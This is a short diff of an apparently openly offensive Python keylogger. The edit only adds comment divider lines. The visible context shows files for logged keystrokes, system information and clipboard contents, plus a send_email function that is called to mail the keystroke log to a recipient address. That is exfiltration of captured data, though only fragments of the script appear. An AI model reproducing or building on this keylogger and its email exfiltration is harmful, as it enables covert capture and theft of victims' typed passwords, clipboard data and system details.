@@ -34,7 +34,7 @@ keys_info_e ='e_key_log.txt'
 system_info_e = 'e_systeminfo.txt'
 clipboard_info_e ='e_clipboard.txt'
 file_merge = file_path + extend
-
+#######################################################################################################
 # Function to send email
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
@@ -59,7 +59,7 @@ def send_email(filename, attachment, toaddr):
     s.quit()
 
 send_email(keys_info, file_path + extend + keys_info, toaddr)
-
+####################################################################################################################
 # Function to collect computer information
 def computer_info():
     with open(file_path + extend + system_info, "a") as f:
